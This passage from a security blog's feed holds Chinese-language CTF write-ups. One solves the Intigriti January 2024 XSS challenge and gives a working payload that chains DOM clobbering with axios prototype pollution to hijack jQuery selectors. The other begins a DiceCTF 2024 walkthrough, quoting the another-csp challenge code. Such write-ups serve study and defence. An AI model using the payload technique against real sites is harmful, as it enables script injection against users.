punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> namespace <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> elem<span class="token punctuation">.</span>namespaceURI<span class="token punctuation">,</span>        docElem <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> elem<span class="token punctuation">.</span>ownerDocument <span class="token operator">||</span> elem <span class="token punctuation">)</span><span class="token punctuation">.</span>documentElement<span class="token punctuation">;</span>    <span class="token comment">// Assume HTML when documentElement doesn't yet exist, such as inside</span>    <span class="token comment">// document fragments.</span>    <span class="token keyword">return</span> <span class="token operator">!</span>rhtmlSuffix<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> namespace <span class="token operator">||</span> docElem <span class="token operator">&amp;&amp;</span> docElem<span class="token punctuation">.</span>nodeName <span class="token operator">||</span> <span class="token string">"HTML"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我們可以透過 DOM clobbering 去覆蓋掉 <code>documentElement</code>，來讓 <code>docElem</code> 變成一個 <code>&lt;img&gt;</code>，因為不是 <code>&lt;html&gt;</code>，就可以讓檢查失效，並且讓 <code>isXMLDoc</code> 變成 true。</p><p>繞過了檢查以後，就暫時不會用原生的那些 API，而是執行到 <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L2001">select</a> 函式，開頭會先將 selector 做 <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1479">tokenize</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> parseOnly</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> matched<span class="token punctuation">,</span> match<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> type<span class="token punctuation">,</span>        soFar<span class="token punctuation">,</span> groups<span class="token punctuation">,</span> preFilters<span class="token punctuation">,</span>        cached <span class="token operator">=</span> tokenCache<span class="token punctuation">[</span> selector <span class="token operator">+</span> <span class="token string">" "</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> cached <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> parseOnly <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> cached<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這邊看起來就是我們要找的地方了！</p><p>只要污染 <code>img.avatar </code>，就可以控制 <code>tokenCache</code> 的內容，進而影響到 tokenize 的結果，直接把結果替代成我們要選的 iframe。</p><p>看來預期解法也沒這麼難嘛。</p><p>但嘗試過後，發現沒有用。</p><p>沒有用的原因不是因為 gadget 找錯，而是因為 prototype pollution 的部分。此時，就被逼得回頭研究之前偷懶只看 exploit 的 axios 漏洞。</p><p>Axios 在把 form 的名稱轉成 JSON 的 key 時，是這樣<a href="https://github.com/axios/axios/blob/v1.6.4/lib/helpers/formDataToJSON.js#L12">運作</a>的：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * It takes a string like `foo[x][y][z]` and returns an array like `['foo', 'x', 'y', 'z'] * * @param &#123;string&#125; name - The name of the property to get. * * @returns An array of strings. */</span><span class="token keyword">function</span> <span class="token function">parsePropPath</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// foo[x][y][z]</span>  <span class="token comment">// foo.x.y.z</span>  <span class="token comment">// foo-x-y-z</span>  <span class="token comment">// foo x y z</span>  <span class="token keyword">return</span> utils<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\w+|\[(\w*)]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">match</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'[]'</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token operator">:</span> match<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">||</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>會把 A-Za-z0-9_ 以外的字元都當作分隔符號，因此空白沒辦法成為屬性名稱的一部分。我在這邊花了三四個小時，沒有找到任何可以繞過的方式。</p><p>此時我知道我錯了，這題真的沒這麼簡單…</p><h2><span id="人生三大錯覺之一我能解開">人生三大錯覺之一：我能解開</span></h2><p>過了一天以後，繼續看這道題目，既然沒辦法用空白，那應該是有其他地方可以利用，於是就接著追蹤程式碼的運作。</p><p>繼續一直往下追的話，會追到 <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1766">matcherFromTokens</a> 這個函式，但裡面的程式碼一樣又多又複雜，於是我第一次看到的時候心裡想著：「算了吧，還是等解答好了」。</p><p>但過了一天之後重振精神，再次從頭開始看起，發現其實在進入 tokenize 之前，就有一個地方可以污染了：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> context<span class="token punctuation">,</span> results<span class="token punctuation">,</span> seed</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> i<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> token<span class="token punctuation">,</span> type<span class="token punctuation">,</span> find<span class="token punctuation">,</span>    compiled <span class="token operator">=</span> <span class="token keyword">typeof</span> selector <span class="token operator">===</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> selector<span class="token punctuation">,</span>    match <span class="token operator">=</span> <span class="token operator">!</span>seed <span class="token operator">&amp;&amp;</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> selector <span class="token operator">=</span> compiled<span class="token punctuation">.</span>selector <span class="token operator">||</span> selector <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這邊有個 <code>selector = compiled.selector || selector</code>，那只要污染 <code>selector</code>，我不就可以任意更改 selector 了嗎？</p><p>正當我為自己的聰明沾沾自喜時，現實馬上跑過來打了我一巴掌，污染了 selector 之後，在進入到 tokenize 時出錯了，因為裡面有一段是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Filters</span><span class="token keyword">for</span> <span class="token punctuation">(</span> type <span class="token keyword">in</span> filterMatchExpr <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> match <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span> soFar <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token operator">!</span>preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span> <span class="token operator">||</span>        <span class="token punctuation">(</span> match <span class="token operator">=</span> preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">(</span> match <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        matched <span class="token operator">=</span> match<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tokens<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">value</span><span class="token operator">:</span> matched<span class="token punctuation">,</span>            <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span>            <span class="token literal-property property">matches</span><span class="token operator">:</span> match        <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        soFar <span class="token operator">=</span> soFar<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> matched<span class="token punctuation">.</span>length <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因為污染了 selector，所以在執行 <code>type in filterMatchExpr</code> 的時候，被污染的 selector 就會被取出來，接著執行到 <code>jQuery.expr.match[ type ].exec</code>，由於字串並沒有 exec 這個方法，所以就會報錯。</p><p>也就是說，不管我們污染了什麼，只要進入到 tokenize 就會出錯，所以想要把 selector 直接污染成 iframe 是辦不到的。</p><p>但沒關係，我們可以把 selector 污染成之前已經在 cache 裡面的東西，例如說 <code>img.loading</code>，就可以繞過 tokenize。</p><p>但這也只是不讓程式壞掉而已，依舊沒辦法把題目解開。</p><h2><span id="還是得靠提示">還是得靠提示</span></h2><p>又過了一兩天，看到了作者在推特上的<a href="https://twitter.com/kevin_mizu/status/1749740885657755842">提示</a>，直接明確指出關鍵就在於我之前因為太複雜所以略過的 addCombinator，從提示中可以看出，我確實只差最後一步了。</p><p>因此又硬著頭皮花了半天左右，稍微 trace 了一下這部分的程式碼，最後才終於得到預期的答案。</p><p>先附上最後的 payload：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>documentElement</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.owner.avatar_url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(document.domain)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.CLASS.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.TAG.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.dir<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentNode<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.selector<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img.loading<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其實最後一部分 addCombinator 那邊有點像是一半用猜的，一半是真的知道，大概就是某一個部分會用 <code>dir</code> 來找匹配的元素，設定成 parentNode 之後就會一直往上找，然後就會配對到整個 HTML 的元素，因此就會幫每一個 element 都加上 src，裡面當然也包含了 iframe。</p><p>但每一個函式的細節我已經忘記了，因為真的有點複雜，如果有興趣知道的話，可以直接去看原作者的 writeup（底下會附上連結）。</p><h2><span id="後記">後記</span></h2><p>我很喜歡這道題目那種循序漸進的感覺，從一開始找到非預期解以為很簡單，到後來找到第一個 cache 的地方以為解開了，卻回頭發現 axios 的 prototype pollution 沒辦法搭配使用，接著找到第二個 <code>compiled.seletor</code> 也以為結束了，才發現其實還沒。</p><p>要一直再往下深追，追到 addCombinator，才能確定這一題是真的可以解開，能在一道題目裡面情緒起伏這麼多次，代表這個題目設計的很好。另一個我很喜歡的點是這是一道逼迫你 code review 的題目，沒看 code 的話是絕對解不開的。我很喜歡 code review，因此也很喜歡這個題目。</p><p>很佩服作者能夠繼續往深處探索，找到這個非常有趣的答案，結合了 DOM clobbering 跟 prototype pollution，修改了 jQuery selector 的指向，出了一題這麼好玩的題目！</p><p>再次推薦作者本人的 writeup，跟我經歷了差不多的過程：<a href="https://mizu.re/post/intigriti-january-2024-xss-challenge">Intigriti January 2024 - XSS Challenge</a></p><p>除此之外，@joaxcar 找到的另外一個非預期解也很有趣，有興趣的可以看看：<a href="https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/">Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)</a></p><p>若是對最一開始的題目有興趣，也可以參考這邊：<a href="https://bugology.intigriti.io/intigriti-monthly-challenges/0124">https://bugology.intigriti.io/intigriti-monthly-challenges/0124</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;上個月（2024 年 1 月）的 Intigriti 挑戰非常有趣，出題者是 &lt;a href=&quot;https://twitter.com/kevin_mizu&quot;&gt;@kevin_mizu&lt;/a&gt;，之前也常在推特上看到他出一些 client-side 相關的題目，而這次的題目品質也一如既往的很好，值得寫一篇紀錄。&lt;/p&gt;
&lt;p&gt;題目的連結在這邊，沒有看過的話可以先去看看：&lt;a href=&quot;https://challenge-0124.intigriti.io/&quot;&gt;https://challenge-0124.intigriti.io/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>DiceCTF 2024 筆記</title>
    <link href="https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/"/>
    <id>https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/</id>
    <published>2024-02-12T04:40:00.000Z</published>
    <updated>2024-02-12T06:24:06.669Z</updated>
    
    <content type="html"><![CDATA[<p>相比於<a href="https://blog.huli.tw/2023/03/26/dicectf-2023-writeup/">去年</a>跟<a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/">前年</a>，今年的 web 題難度有顯著降低了不少，變得更平易近人了，靠著隊友的努力拿下了第一名，而 web 題也只剩一題沒解出來。</p><p>這次我基本上只解了簡單的 funnylogin 跟難的 safestlist，其他都是隊友解開的，還有另一題 another-csp 有看了一下，因此這篇只會記我有看過的以及比較難的題目。</p><p>如果想看其他題，可以參考其他人的 writeup：</p><ol><li><a href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003">st98 - DiceCTF 2024 Quals writeup</a></li><li><a href="https://one3147.tistory.com/77">0xOne - 2024 Dice CTF Write up [Web]</a></li></ol><p>官方提供的所有題目原始碼：<a href="https://github.com/dicegang/dicectf-quals-2024-challenges">https://github.com/dicegang/dicectf-quals-2024-challenges</a></p><p>關鍵字列表：</p><ol><li>crash chromium</li><li>slower css style</li><li>xsleak</li><li>URL length limit</li><li>service worker</li><li>background fetch</li><li>connection pool + css injection</li><li>iframe width + css inection</li></ol><span id="more"></span><h2><span id="webx2fanother-csp-16-solves">web&#x2F;another-csp (16 solves)</span></h2><p>這題的程式碼滿簡單的，簡化過後如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>another-csp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sandbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sandbox<span class="token punctuation">"</span></span> <span class="token attr-name">sandbox</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> code <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">const</span> token <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">'0'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> content <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h1 data-token="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>code<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>srcdoc <span class="token operator">=</span> content<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你可以插入任意程式碼到 iframe 裡面，目標是偷到相同網頁下的 token。</p><p>而重點是 iframe 的 sandbox 全開，CSP 也封鎖得很死。從這兩個線索中，可以得出限制是：</p><ol><li><code>defeault-src &#39;none&#39;</code>，所以禁止引入任何外部資源</li><li><code>sandbox</code>，因此不能執行任何 JavaScript，也無法透過 meta 重新導向</li></ol><p>少了 JavaScript 以後，就少很多攻擊面了，因此只能從 HTML 與 CSS 下手。這一題的 CSS 有開 unsafe-inline，所以是可以加上 CSS 的。</p><p>不過無論如何，看起來都沒辦法對外發送 request，因此要嘛是找到 bypass（例如說 dns prefetch，但這題應該也不適用），要嘛就是要搭配題目的其他部分。</p><p>這一題的 bot 的運作方式不太一樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> createServer <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'http'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> readFileSync <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'fs'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> spawn <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'child_process'</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> randomInt <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'crypto'</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">timeout</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">wait</span> <span class="token operator">=</span> <span class="token parameter">child</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> child<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span> resolve<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> index <span class="token operator">=</span> <span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> token <span class="token operator">=</span> <span class="token function">randomInt</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> browserOpen <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token parameter">code</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  browserOpen <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> proc <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'node'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'visit.js'</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> code<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">detached</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> Promise<span class="token punctuation">.</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token function">wait</span><span class="token punctuation">(</span>proc<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>proc<span class="token punctuation">.</span>exitCode <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    process<span class="token punctuation">.</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>proc<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  browserOpen <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">,</span> <span class="token string">'http://localhost/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname <span class="token operator">===</span> <span class="token string">'/bot'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>browserOpen<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'already open!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> code <span class="token operator">=</span> url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>code <span class="token operator">||</span> code<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token 